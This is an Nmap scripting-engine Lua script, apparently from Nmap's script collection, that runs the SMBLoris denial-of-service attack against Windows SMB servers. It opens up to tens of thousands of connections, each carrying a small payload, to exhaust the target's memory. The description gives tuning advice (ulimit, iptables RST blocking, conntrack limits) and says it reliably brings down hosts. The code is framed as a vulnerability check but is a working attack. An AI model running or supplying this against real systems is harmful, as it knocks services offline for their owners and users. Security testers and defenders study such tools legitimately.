local smb = require "smb"
local stdnse = require "stdnse"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
This script attempts to perform a Denial of Service on the target host with the
the SMBLoris vulnerability. This attack allows up to 8GB of physical RAM to be
used per source IP (where each source port consumes 128KB).

As of 8 Aug 2017, there has been no plans to patch this.

This script is based off the script used by zerosum0x0 in his original
demonstration at DEFCON, which was released to public in a PR on Metasploit.

To use the script, you need to make sure that your <code>ulimit -n</code> is
at least 65535. You may also need iptables to block outbound RST packets.
Increasing the local conntrack limit may also help, i.e.
<code> echo 1200000 > /proc/sys/net/netfilter/nf_conntrack_max </code> The
network quality is also important to the success of the script as the ports
connect to the host synchronously.

Due to certain limitations which exact cause cannot be determined, there may
be a limit on the amount of sockets that can be maintained at any given time.
You may not get the full 8GiB per IP. The script has been tested to reliably
bring down a host with 3GiB of RAM.

Improvements to the script can look at making it asynchronous. Attempts have
been made, but because of the above limitations, results may vary.

References:
* http://smbloris.com/
* https://github.com/rapid7/metasploit-framework/pull/8796
* https://gist.github.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e
]]
---
-- @usage nmap --script smb-smbloris 192.168.15.155 -p445
--
-- @output
-- PORT    STATE SERVICE      REASON
-- 445/tcp open  microsoft-ds syn-ack ttl 128
-- MAC Address: 00:0C:29:29:B7:E0 (VMware)
--
-- | smb-smbloris:
-- |   VULNERABLE:
-- |   Denial of service attack against Microsoft Windows SMB servers (SMBLoris)
-- |     State: VULNERABLE
-- |     Risk factor: HIGH  CVSSv3: 8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)
-- |       All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.
-- |
-- |     Disclosure date: 2017-08-1
-- |     References:
-- |_      http://smbloris.com/
--
-- @xmloutput
-- <script id="smb-smbloris" output="&#xa;  VULNERABLE:&#xa;  Denial of service attack against Microsoft Windows SMB servers (SMBLoris)&#xa;    State: VULNERABLE&#xa;    Risk factor: HIGH  CVSSv3: 8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)&#xa;      All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.&#xa;      &#xa;    Disclosure date: 2017-08-1&#xa;    References:&#xa;      http://smbloris.com/&#xa;"><table key="NMAP-1">
-- <elem key="title">Denial of service attack against Microsoft Windows SMB servers (SMBLoris)</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="scores">
-- <elem key="CVSSv3">8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)</elem>
-- </table>
-- <table key="description">
-- <elem>All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.&#xa;</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="month">08</elem>
-- <elem key="day">1</elem>
-- <elem key="year">2017</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2017-08-1</elem>
-- <table key="refs">
-- <elem>http://smbloris.com/</elem>
-- </table>
-- </table>
-- </script>
-- @args smb-smbloris.timeout Time in seconds for the script to timeout. Default: 1000
-- @args smb-smbloris.ports Number of ports to connect from. Default: 20000
--
---

author = "Paulino Calderon, Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "dos"}

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local host_down = false
local TIMEOUT = 1000 -- number of seconds to timeout the attack
local NUM_PORTS = 20000 -- number of ports to connect from
local skts = {}
local CRITICAL_VALUE_99 = 3.3
local SMBLORIS_PAYLOAD = '\x00\x01\xff\xff'

--- calculates the arithmetic mean for time by averaging the values
--  @param times an array of timings
--  @return the mean calculated from the array of timings
local function get_mean(times)
  local sum = 0
  for _, time in pairs(times) do
    sum = sum + time
  end

  return sum / #times
end

--- calculates the std err for time by finding the variance the taking the sqrt
--  @param times an array of timings
--  @return the std err calculated from the array of timings
local function get_standard_err(times)
  local mean = get_mean(times)

  local variance = 0
  for _, time in pairs(times) do
    variance = variance + (time - mean)^ 2
  end

  return math.sqrt(variance)
end

--- calcualates the confidence interval from timings
--  @param times an array of timings
--  @return the deviation from the mean signifying the 99% confidence interval
local function get_ci(times)
  local std_err = get_standard_err(times)
  return CRITICAL_VALUE_99 * std_err
end

local function set_baseline(host)
  local times = {}
  -- sample 30 times
  for i=1, 30, 1 do
    local start_time = nmap.clock_ms()
    local status = smb.get_os(host)

    if not status then
      stdnse.debug1("Error querying SMB through OS, can't determine if host is alive")
      return nil
    end

    local end_time = nmap.clock_ms()

    table.insert(times, end_time - start_time)
  end

  local mean = get_mean(times)
  local ci = get_ci(times)
  return mean, ci
end


local function check_alive(host, mean, ci)
  local start_time = nmap.clock_ms()
  local status = smb.get_os(host)
  local end_time = nmap.clock_ms()

  -- if the get_os fails or it exceeds our 99% threshold we are reasonably
  -- confident that it is vulnerable
  if not status or (end_time - start_time) - mean > ci then
    host_down = true
  end
end

local function send_dos(host, port)
  if host_down then
    return
  end

  local socket = nmap.new_socket()

  local try = nmap.new_try()

  stdnse.debug1("Number of ports connected: %s", #skts)

  local status, err = socket:connect(host, port)
  socket:send(SMBLORIS_PAYLOAD)
  if status then
    table.insert(skts, socket)
  else
    -- do until it succeeds
    send_dos(host, port)
  end
end

action = function(host)
  port = smb.get_port(host)
  local vuln = {
    title = "Denial of service attack against Microsoft Windows SMB servers (SMBLoris)",
    risk_factor = "HIGH",
    scores = {
      CVSSv3 = "8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)"
    },
    description = [[
All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.
]],
    references = {
      'http://smbloris.com/',
    },
    dates = {
      disclosure = {year = '2017', month = '08', day = '1'},
    }
  }
  local report = vulns.Report:new(SCRIPT_NAME, host)
  vuln.state = vulns.STATE.NOT_VULN

  local timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.timeout'))
    or TIMEOUT
  local num_ports = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.ports'))
    or NUM_PORTS
  local script_start = nmap.clock()
  local mean, ci = set_baseline(host)

  -- nil means the smb.get_os failed, we return since we cannot check
  if mean == nil then
    return
  end

  stdnse.debug1("Mean: %s, 99%% interval: ± %s", mean, ci)
  local timed_out = false
  -- each port allocates 128KiB
  -- max is 65000 instead of 65535 prevents crash of too many files open
  for i=1, num_ports, 1 do
    send_dos(host, port)

    if i % 1000 == 0 and i <= 60000 then
      -- prevents crash when i >= 61000
      check_alive(host, mean, ci)
      if host_down then break end
    end

    -- has it timed out yet?
    if nmap.clock() - timeout >= script_start then
      stdnse.debug1("Script timed out at %s", timeout)
      break
    end
  end

  if host_down then
    vuln.state = vulns.STATE.VULN
  end

  return report:make_output(vuln)
end
